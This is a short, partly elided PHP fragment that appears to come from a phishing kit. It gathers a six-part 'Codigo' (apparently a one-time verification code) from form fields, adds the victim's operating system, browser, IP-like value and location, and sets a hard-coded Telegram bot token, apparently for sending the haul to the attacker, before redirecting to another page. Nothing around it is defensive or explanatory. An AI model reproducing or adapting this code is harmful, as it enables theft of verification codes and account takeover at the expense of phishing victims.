...
$message = "Codigo: ".$_POST['num1']."".$_POST['num2']."".$_POST['num3']."".$_POST['num4']."".$_POST['num5']."".$_POST['num6']."\r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "7456446404:AAG4fs8CtPgfuR5OLZ4oxn6HErCXPfAv53c";
...
}else{ header ('location: index4.php'); exit();
 }
